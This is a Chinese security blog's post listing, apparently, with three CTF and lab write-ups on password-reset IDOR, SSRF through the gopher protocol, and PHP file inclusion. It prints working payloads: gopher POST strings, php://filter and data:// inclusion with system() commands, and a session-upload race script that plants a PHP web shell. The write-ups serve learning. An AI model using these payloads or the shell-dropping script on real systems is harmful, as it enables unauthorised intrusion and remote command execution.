-      <a class="article-title" href="/2021/11/26/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86%EF%BC%882%EF%BC%89wp/">一次靶场经历（2）wp</a>
-    </h1>
-  
-
-        
-        <a href="/2021/11/26/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86%EF%BC%882%EF%BC%89wp/" class="archive-article-date">
-  	<time datetime="2021-11-26T04:50:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>登录靶场地址，发现迎面而来也是一个熟悉的登陆界面。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126125124532.png" alt="image-20211126125124532"></p>
-<p>一般有这种登录界面的，我们的首要目标都是先注册一个账号试试看。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126125554549.png" alt="image-20211126125554549"></p>
-<p>然后登录我们的账号</p>
-<p>发现出题人留了提醒：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126125646550.png" alt="image-20211126125646550"></p>
-<p>所以我们的办法肯定是想办法登录admin账号，根据出题人的提示是通过重置密码，所以我们先尝试修改自己的密码，来看一下抓包情况</p>
-<p>抓到这样一个包</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126130513485.png" alt="image-20211126130513485"></p>
-<p>当放过这个包，注册的邮箱就会收到一封验证码邮件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126130607264.png" alt="image-20211126130607264"></p>
-<p>然后填入验证码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126130639075.png" alt="image-20211126130639075"></p>
-<p>选择重设密码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126130724250.png" alt="image-20211126130724250"></p>
-<p>可以抓到这样的验证包，然后浏览器会自动弹出已经把密码设置位asd123.</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126130746297.png" alt="image-20211126130746297"></p>
-<p>这里有两个解法，第一个是使用爆破，我们已经知道当发送验证码的时候。后台会生成一个随机六位数密码发给我们的注册邮箱，然后我们拿着这个邮箱，点击重设密码他就会设置默认新的密码asd123.</p>
-<p>所以我们可以用bp的爆破功能，去爆破随机验证码。然后不断发送带着验证码的包，去重置密码。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126131411229.png" alt="image-20211126131411229"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126131520816.png" alt="image-20211126131520816"></p>
-<p>到最后爆破出来一个包，就可以使用默认密码asd123登录admin账号了</p>
-<p>还有第二种方法就是逻辑漏洞。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126131721856.png" alt="image-20211126131721856"></p>
-<p>我们只需要把在发送验证码包的时候，把这个邮箱填成自己的邮箱，然后后台就会把言验证码乖乖发给我们的邮箱</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126131847703.png" alt="image-20211126131847703"></p>
-<p>这个漏洞在行业内被专业称为**<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43006749/article/details/100138843">idor</a>**(不安全的直接对象引用)</p>
-<p>然后我们就可以通过admin登录了！</p>
-<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>登录后发现这样一个界面</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126132039813.png" alt="image-20211126132039813"></p>
-<p>既然他都说提交一个图片地址，那我们就输入一个图片地址把。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126132342222.png" alt="image-20211126132342222"></p>
-<p>（hhhhhhh）</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126132413576.png" alt="image-20211126132413576"></p>
-<p>然后会发现显示出php的代码，但是可以看出它下载了我们的图片。</p>
-<p>于是经过缜密的推理我们可以知道这就是传说中的<strong>ssrf漏洞</strong></p>
-<p>当我们尝试在图片下载地址的时候输入以下payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126133049816.png" alt="image-20211126133049816"></p>
-<p>会看出我们确实可以满足请求来自本地的条件，但是要求我们必须用post方式提交1=1（http协议只能在后缀用?key=value利用get方式提交参数和值。)</p>
-<p>不然就不会回显flag。这个时候我们就必须使用一个古老的协议来做这个题目。（用前朝的剑斩本朝的官），它就是-<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议</a>。</p>
-<p>可以在文章中看到使用gopher协议发送http的数据，需要以下三个步骤：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126133425739.png" alt="image-20211126133425739"></p>
-<p>并且如果拿来发送post请求，那么构造的http数据包里必须包含4个必要参数</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126133520295.png" alt="image-20211126133520295"></p>
-<p>所以我们构建一个这样的数据包</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126133602226.png" alt="image-20211126133602226"></p>
-<p>利用python，下面贴出用python3写的脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp=<span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1=1&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">temp=urllib.parse.quote(exp)</span><br><span class="line">temp=temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">temp=<span class="string">&#x27;_&#x27;</span>+temp</span><br><span class="line">temp=temp+<span class="string">&#x27;%0D%0A&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(temp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>来进行转换，于是得到经过转码得到以下字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%203%0D%0A%0D%0A1%3D1%0D%0A</span><br></pre></td></tr></table></figure>
-
-<p>然后在提交图片地址的那里填入payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:8081/_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%203%0D%0A%0D%0A1%3D1%0D%0A</span><br><span class="line">（8081是靶场开放的端口，gopher协议默认的端口是70）</span><br></pre></td></tr></table></figure>
-
-<p>随后便可以得到flag</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211126134001214.png" alt="image-20211126134001214"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次靶场经历让菜鸡学习了gopher协议，并且对ssrf协议有了更深的了解，之前都是只知道这些各种各样的漏洞类型，现在经过不断的被打击，对这些漏洞有了更深的理解，以后有时间会重新好好温习一次owasp10，了解各种漏洞的成因，希望有新的感悟。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/11/26/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86%EF%BC%882%EF%BC%89wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Gopher协议在ssrf漏洞中的应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/25/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">Gopher协议在ssrf漏洞中的应用</a>
-    </h1>
-  
-
-        
-        <a href="/2021/11/25/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2021-11-25T13:24:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="肾么事Gopher协议"><a href="#肾么事Gopher协议" class="headerlink" title="肾么事Gopher协议"></a>肾么事Gopher协议</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211125212755436.png" alt="image-20211125212755436"></p>
-<p>但是它的特殊性在于它支持发出GET、POST请求:可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。</p>
-<h2 id="它的协议格式"><a href="#它的协议格式" class="headerlink" title="它的协议格式"></a>它的协议格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>gopher的默认端口是70</li>
-<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
-<li>使用Gopher协议时需要在url后加入一个字符（随便写）因为这个字符会在传过去的时候被自动忽略掉</li>
-</ul>
-<h1 id="Gopher发送请求HTTP-GET请求"><a href="#Gopher发送请求HTTP-GET请求" class="headerlink" title="Gopher发送请求HTTP GET请求"></a>Gopher发送请求HTTP GET请求</h1><p>如何使用gopher协议发送HTTP的数据呢？需要以下三步:</p>
-<ol>
-<li>构造http数据包</li>
-<li>url编码、替换回车换行为%0d%0a</li>
-<li>发送gopher协议</li>
-</ol>
-<p>比如一个GET型的http包，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf/base/get.php?name=Margin HTTP/1.1</span><br><span class="line">Host: 192.168.0.109</span><br></pre></td></tr></table></figure>
-
-<p>url编码后为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure>
-
-<p>在转换为url编码的时候需要注意以下几点:</p>
-<ol>
-<li>问号(?)需要转码为url编码，也就是%3f</li>
-<li>回车换行要变为%0d%0a，但是如果直接用工具转，可能只会有%0a</li>
-<li>在http包的最后要加%0d%0a，代表消息结束</li>
-</ol>
-<h1 id="Gopher发送请求HTTP-POST请求"><a href="#Gopher发送请求HTTP-POST请求" class="headerlink" title="Gopher发送请求HTTP POST请求"></a>Gopher发送请求HTTP POST请求</h1><p>POST数据包的格式为：</p>
-<p>（ps：以下几个参数是提交post请求的时候必须有的参数）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></table></figure>
-
-<p>将上面的post数据包进行url编码并且改为Gopher协议为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里给出一个post修改的python脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exp=<span class="string">&quot;&quot;&quot;（exp填写http数据包格式）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">temp=urllib.parse.quote(exp)</span><br><span class="line">temp=temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">temp=<span class="string">&#x27;_&#x27;</span>+temp</span><br><span class="line">temp=temp+<span class="string">&#x27;%0D%0A&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(temp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>比如：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp=<span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 3  （记得length和提交的post保持一致）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1=1&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">temp=urllib.parse.quote(exp)</span><br><span class="line">temp=temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">temp=<span class="string">&#x27;_&#x27;</span>+temp</span><br><span class="line">temp=temp+<span class="string">&#x27;%0D%0A&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(temp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/11/25/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CtfShow36D练手赛" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/11/CtfShow36D%E7%BB%83%E6%89%8B%E8%B5%9B/">CtfShow36D练手赛</a>
-    </h1>
-  
-
-        
-        <a href="/2021/10/11/CtfShow36D%E7%BB%83%E6%89%8B%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2021-10-11T00:46:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h1><p>打开环境，发现一排平平无奇的字母。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011084831993.png" alt="image-20211011084831993"></p>
-<p>抓包发现仍然是同样的东西，遂及开始萌新的思考。</p>
-<p>（此处省略三分….）</p>
-<p>这排字符应该是为了给我们提示：告诉我们环境是php，需要提交参数file，而且file里还必须要含有test。看到file，就不得不让人想起文件包含漏洞，看到文件包含漏洞，就不得不让人想起php伪协议，遂构造php伪协议读取源码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test</span><br></pre></td></tr></table></figure>
-
-<p>发现他会默认添加后缀php，于是我们加个.  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test.</span><br></pre></td></tr></table></figure>
-
-<p>出现一小串字符进行解码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011090029985.png" alt="image-20211011090029985"></p>
-<p>…………….</p>
-<p>说明我最先认为flag是在一个叫做test的php文件下，是错误的。遂我们想要找到网站的源码，于是，想办法构造伪协议去看Index.php的源码！</p>
-<p>然后我们继续找一下，发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test/../index.</span><br></pre></td></tr></table></figure>
-
-<p>可以读取到网站index.php的源码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011090956513.png" alt="image-20211011090956513"></p>
-<p>发现源码中除了要求有test以外，并没有对file有什么过滤。更加确定了文件包含漏洞。于是想到用data://伪协议来进行命令执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;test</span><br></pre></td></tr></table></figure>
-
-<p>后面的test是为了满足正则匹配式，发现查出两个应该没什么用的文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011092223208.png" alt="image-20211011092223208"></p>
-<p>然后我们想到应该去网站根目录查找，于是键入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php system(&#x27;ls /&#x27;);?&gt;test</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011092342208.png" alt="image-20211011092342208"></p>
-<p>发现根目录下有以下文件:</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011092421507.png" alt="image-20211011092421507"></p>
-<p>发现这个奇形怪状的名字，选择查看，可以得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=?file=data:text/plain,&lt;?php system(&#x27;cat /FFFFFFFL@GGGG&#x27;)?&gt;TEST</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011092633151.png" alt="image-20211011092633151"></p>
-<h1 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h1><p>打开环境查看源码，发现有提示信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure>
-
-<p>除此之外一脸懵逼。</p>
-<p>老办法，<strong>遇事不决，抓包先行</strong>：</p>
-<p>发现每次提交请求都会带有一个关于Hash值得cookie，结合题目，hash值就是经过md5转码得，所以尝试把这个hash值带入pass参数。而name一般我们都会默认为管理员，于是提交如下包</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011094624650.png" alt="image-20211011094624650"></p>
-<p>发现了一个叫做flflflflag.php的文件。</p>
-<p>然后再用bp去访问这个文件，发现如果你用浏览器访问的话，会把你跳转到一个伪造的404页面，但是用bp可以看到网页的源码为</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011095108870.png" alt="image-20211011095108870"></p>
-<p>又见到了include()于是又想到php伪协议读取源码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;yesec want Girl friend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>发现正则表达式中屏蔽了很多关键词data input zip。</p>
-<p>到这里我也不晓得怎么做了，但是看到网上师傅选择用session上传去做，就查阅了相关文档，get了新知识</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273">session进行文件包含</a></p>
-<p>然后脚本抄的网上师傅的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host = &#x27;http://5d6bb0b0-e82d-4a68-b50b-8fd858a7c6ea.chall.ctf.show/flflflflag.php&#x27;</span><br><span class="line">sessid = &#x27;vrhtvjd4j1sd88onr92fm9t2sj&#x27;  #这你是你想要自己写入的sessid值</span><br><span class="line">#这是发送请求的函数。</span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;&#125;,   </span><br><span class="line">            files=&#123;&quot;file&quot;:(&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line">#这是检查是否成功写入的函数</span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        if &#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; not in response.text:  #c4ca4238a0b923820dcc509a6f75849b这一串是1的md5值。</span><br><span class="line">            print(&#x27;[+++]retry&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
-
-<p>之后写入了一句话木马，通过antsword想连接，发现打开一片空白。看来是做了某一种措施，无法读取到文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011140830766.png" alt="image-20211011140830766"></p>
-<p>于是就只有在浏览器来看。通过浏览器cmd命令键入phpinfo();查看信息</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011140945363.png" alt="image-20211011140945363"></p>
-<p>在environment下看到FLAG</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211011141259856.png" alt="image-20211011141259856"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/11/CtfShow36D%E7%BB%83%E6%89%8B%E8%B5%9B/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
